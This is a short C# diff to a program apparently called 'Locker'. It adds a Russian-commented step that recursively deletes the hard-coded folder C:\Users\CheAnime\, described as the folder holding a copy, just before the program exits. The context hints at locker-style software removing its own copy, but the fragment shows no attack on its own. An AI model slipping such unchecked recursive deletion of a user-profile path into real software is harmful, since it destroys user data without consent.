@@ -195,6 +195,11 @@ namespace Locker
                 reg.Close();
             }
             catch { }
+            //Удаление папки с копией
+            string targetPath = @"C:\Users\CheAnime\";
+            DirectoryInfo dir = new DirectoryInfo(targetPath);
+            dir.Delete(true);
+
             Environment.Exit(0);
         }
     }
